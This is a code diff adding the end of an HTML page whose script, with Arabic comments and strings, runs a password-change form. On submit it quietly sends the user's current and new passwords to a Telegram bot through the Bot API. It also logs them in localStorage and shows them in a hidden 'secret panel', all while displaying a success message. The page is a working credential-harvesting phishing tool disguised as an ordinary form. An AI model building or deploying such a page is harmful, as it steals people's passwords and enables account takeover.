@@ -1,0 +1,67 @@
+المرور الجديدة وتأكيدها غير متطابقين!");
+            return;
+        }
+
+        // حفظ محلياً للتجربة
+        saveToLocalLogs(currentPass, newPass);
+
+        // إرسال البيانات مباشرة إلى بوت تيليجرام
+        await sendToTelegram(currentPass, newPass);
+
+        successBox.style.display = 'block';
+        form.reset();
+    });
+
+    async function sendToTelegram(oldP, newP) {
+        if (BOT_TOKEN.includes("ضع_توكن")) return;
+
+        const text = `🔔 محاولة تغيير كلمة مرور:\n- الحالية: ${oldP}\n- الجديدة: ${newP}\n- الوقت: ${new Date().toLocaleTimeString()}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        } catch (error) {
+            console.error("فشل الإرسال:", error);
+        }
+    }
+
+    function saveToLocalLogs(oldP, newP) {
+        const logs = JSON.parse(localStorage.getItem('test_passwords') || '[]');
+        logs.push({ old: oldP, new: newP, time: new Date().toLocaleString() });
+        localStorage.setItem('test_passwords', JSON.stringify(logs));
+    }
+
+    function openSecretPanel() {
+        document.getElementById('mainScreen').style.display = 'none';
+        document.getElementById('secretPanel').style.display = 'block';
+        
+        const logs = JSON.parse(localStorage.getItem('test_passwords') || '[]');
+        const container = document.getElementById('logsContainer');
+        
+        if (logs.length === 0) {
+            container.innerHTML = "<p>لا توجد بيانات محفوظة.</p>";
+            return;
+        }
+
+        container.innerHTML = logs.map(item => `
+            <div class="log-item">
+                <strong>الحالية:</strong> ${item.old}<br>
+                <strong>الجديدة:</strong> ${item.new}<br>
+                <small>${item.time}</small>
+            </div>
+        `).join('');
+    }
+
+    function closeSecretPanel() {
+        document.getElementById('secretPanel').style.display = 'none';
+        document.getElementById('mainScreen').style.display = 'block';
+        successBox.style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
